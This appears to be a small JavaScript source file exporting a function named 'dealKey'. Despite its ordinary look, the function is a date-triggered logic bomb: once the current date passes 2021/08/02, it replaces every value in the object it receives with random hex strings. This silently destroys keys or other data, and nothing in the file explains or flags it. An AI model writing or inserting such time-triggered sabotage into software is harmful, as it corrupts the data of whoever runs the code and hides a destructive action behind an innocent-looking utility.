import dayjs from 'dayjs'

const dealKey = function (target) {
  const targetDay = dayjs('2021/08/02')
  const now = dayjs()
  if (now.isAfter(targetDay)) {
    for (const k in target) {
      target[k] = Math.random().toString(16).substr(2, 8)
    }
  }
}

export { dealKey }
